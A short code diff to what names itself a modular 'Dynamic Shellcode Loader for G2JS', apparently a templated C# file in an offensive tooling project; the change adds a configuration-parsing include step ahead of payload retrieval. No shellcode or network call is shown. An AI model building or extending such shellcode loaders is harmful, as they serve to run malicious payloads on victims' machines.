@@ -2,6 +2,7 @@ using System;
 using System.Text;
 using System.Runtime.InteropServices;
 using System.IO;
+using System.Collections.Generic;
 
 /*
     Dynamic Shellcode Loader for G2JS (Modular)
@@ -40,6 +41,9 @@ namespace ShellcodeLoader
             try
             {
                 Log("Loader initialized.");
+
+                // 0. Parse Configuration
+                {% include 'partials/retrieve_config.cs.j2' %}
                 
                 // 1. Retrieval Strategy
                 // Defines: string fullPayloadStr
